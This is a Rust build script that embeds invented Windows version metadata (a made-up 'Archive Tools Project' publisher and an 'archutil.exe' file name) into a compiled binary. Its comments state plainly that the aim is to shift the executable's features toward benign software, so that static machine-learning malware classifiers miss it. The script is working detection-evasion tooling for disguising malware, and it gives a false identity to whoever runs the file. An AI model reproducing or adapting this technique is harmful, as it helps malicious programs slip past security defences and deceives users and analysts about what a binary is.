// build.rs
// Embed a VERSIONINFO resource block so the compiled PE has legitimate-looking
// metadata (FileDescription, CompanyName, ProductName, version strings).
//
// Rust binaries built without resources have an empty .rsrc section, which is
// a strong feature for static ML malware classifiers that weight PE resource
// presence.  Adding a plausible VERSIONINFO block shifts the PE feature vector
// toward benign utility software without affecting runtime behavior.
//
// Uses winresource (maintained fork of winres) which shells out to the mingw
// windres already present in the toolchain.

fn main() {
    // Only emit resources when targeting Windows.
    let target = std::env::var("TARGET").unwrap_or_default();
    if !target.contains("windows") {
        return;
    }

    let mut res = winresource::WindowsResource::new();
    res.set("FileDescription",  "File Archive Utility");
    res.set("ProductName",      "Archive Tools");
    res.set("CompanyName",      "Archive Tools Project");
    res.set("LegalCopyright",   "Copyright (C) Archive Tools Project. All rights reserved.");
    res.set("OriginalFilename", "archutil.exe");
    res.set("InternalName",     "archutil");
    res.set("FileVersion",      "3.12.4.0");
    res.set("ProductVersion",   "3.12.4.0");

    // Non-fatal: if windres is missing, skip resources rather than break the build.
    let _ = res.compile();
}
